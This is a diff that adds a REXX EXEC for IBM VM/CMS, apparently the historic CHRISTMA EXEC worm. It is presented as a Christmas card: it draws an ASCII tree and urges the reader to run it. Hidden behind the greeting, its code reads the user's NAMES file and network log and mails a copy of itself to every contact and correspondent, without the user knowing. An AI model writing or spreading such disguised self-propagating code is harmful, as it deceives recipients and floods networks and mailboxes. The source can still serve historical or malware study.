@@ -1,0 +1,105 @@
+/*********************/
+/* LET THIS EXEC */
+/* */
+/* RUN */
+/* */
+/* AND */
+/* */
+/* ENJOY */
+/* */
+/* YOURSELF! */
+/*********************/
+'VMFCLEAR'
+SAY ' * '
+SAY ' * '
+SAY ' *** '
+SAY ' ***** '
+SAY ' ******* '
+SAY ' ********* '
+SAY ' ************* A'
+SAY ' ***** '
+SAY ' ********* VERY'
+SAY ' ************* '
+SAY ' ***************** HAPPY'
+SAY ' ********* '
+SAY ' ************* CHRISTMAS'
+SAY ' ***************** '
+SAY ' ********************* AND'
+SAY ' ************* '
+SAY ' ***************** BEST WISHES'
+SAY ' ********************* '
+SAY ' ************************* FOR THE NEXT'
+SAY ' ***** '
+SAY ' ***** YEAR '
+SAY ' ***** '
+
+/* browsing this file is no fun at all
+just type CHRISTMAS from CMS */
+dropbuf
+makebuf
+"q t (stack"
+
+pull d1 d2 d3 d4 d5 dat
+pull zline
+year = substr(dat,7,2)
+day = substr(dat,4,2)
+month = substr(dat,1,2)
+if year <= 88 then do
+if month < 2 ] month = 12 then do
+DROPBUF
+MAKEBUF
+"IDENTIFY ( FIFO"
+PULL WHO FROM WHERE IS REMAINING
+DROPBUF
+MAKEBUF
+
+"EXECIO * DISKR " WHO " NAMES A (FIFO"
+DO WHILE QUEUED() >0
+PULL NICK NAME ORT
+NAM =INDEX(NAME,'.')+1
+IF NAM>0 THEN DO
+NAME=SUBSTR(NAME,NAM)
+END
+NAM = INDEX(ORT,'.')+1
+IF NAM >0 THEN DO
+ORT=SUBSTR(ORT,NAM)
+END
+IF LENGTH(NAME)>0 THEN DO
+ORT=WHERE
+END
+if name ^="RELAY" then do
+"SF CHRISTMAS EXEC A " NAME " AT " ORT " (ack"
+end
+END
+END
+DROPBUF
+MAKEBUF
+AMT=1
+
+"EXECIO * DISKR " WHO " NETLOG A (FIFO"
+DO WHILE QUEUED()>0
+PULL KIND FN FT FM ACT FROM ID AT NODE REMAINING
+IF ACT='SENT' THEN DO
+IF AMT=1 THEN DO
+OK.AMT=ID
+END
+IF AMT>1 THEN DO
+OK.AMT=ID
+NIXIS=0
+DO I=1 TO AMT-1
+IF OK.I=ID THEN DO
+NIXIS=1
+END
+END
+END
+AMT=AMT+1
+IF NIXIS=0 THEN DO
+"SF CHRISTMAS EXEC A " ID " AT " NODE " (ack"
+END
+END
+END
+DROPBUF
+END
+end
+end
+
